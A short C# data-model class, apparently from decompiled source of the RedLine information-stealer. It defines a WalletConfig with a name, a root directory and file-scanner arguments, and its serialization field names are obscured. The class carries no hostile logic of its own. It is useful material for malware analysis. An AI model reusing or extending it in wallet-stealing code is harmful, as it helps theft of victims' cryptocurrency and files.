using System.Collections.Generic;
using System.Runtime.Serialization;

namespace RedLine.SharedModels;

[DataContract(Name = "Entity17", Namespace = "Entity")]
public class WalletConfig
{
	[DataMember(Name = "Id1")]
	public string Name { get; set; }

	[DataMember(Name = "Id2")]
	public string RootDir { get; set; }

	[DataMember(Name = "Id3")]
	public List<FileScannerArg> ScannerArgs { get; set; }
}
